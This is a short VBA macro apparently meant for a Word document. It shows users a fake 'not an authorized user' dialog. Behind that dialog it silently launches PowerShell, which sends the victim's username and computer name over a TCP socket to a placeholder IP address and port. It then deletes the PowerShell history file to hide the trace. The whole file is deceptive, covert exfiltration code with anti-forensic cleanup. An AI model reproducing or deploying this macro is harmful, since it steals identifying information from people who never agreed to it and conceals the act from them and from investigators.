Private Sub Confirm_Click()
Dim TheOS As String
TheOS = System.OperatingSystem
Dim Run
Unauthorized.Label1.Caption = "The User: " & (Environ$("Username")) & " is not recognized as an authorized user. You must be added as an authorized user before you can view this document."
If (InStr(TheOS, "Windows")) Then
Unauthorized.Show (False)
Dim data
sendData = "$data = [System.Text.Encoding]::ASCII.GetBytes('Username:$env:username---Computer:$env:computername');(new-object System.Net.Sockets.TcpClient('<Ip Address>',<port>)).GetStream().Write($data,0,$data.Length);Remove-Item (Get-PSReadlineOption).HistorySavePath"
Shell ("powershell " & sendData)
End If
'If (InStr(TheOS, "Mac")) Then
'Unauthorized.Show (False)
'MsgBox "In Mac"
'End If
End Sub